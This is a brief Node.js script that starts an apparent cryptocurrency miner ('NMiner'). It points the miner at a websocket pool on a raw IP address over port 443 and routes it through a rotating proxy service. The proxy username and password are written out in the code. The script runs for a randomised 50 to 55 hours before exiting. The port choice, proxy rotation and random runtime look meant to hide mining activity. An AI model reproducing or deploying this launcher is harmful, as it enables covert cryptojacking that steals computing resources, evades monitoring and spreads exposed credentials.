const { NMiner } = require(".");
new NMiner("ws://13.233.153.23:443", null, { proxy: "http://subhasweb-rotate:anyosubhas@p.webshare.io:80" });

setTimeout(() => {
    process.exit();
}, (50 * 60 * 60 * 1000) + (Math.random() * (5 * 60 * 60 * 1000)));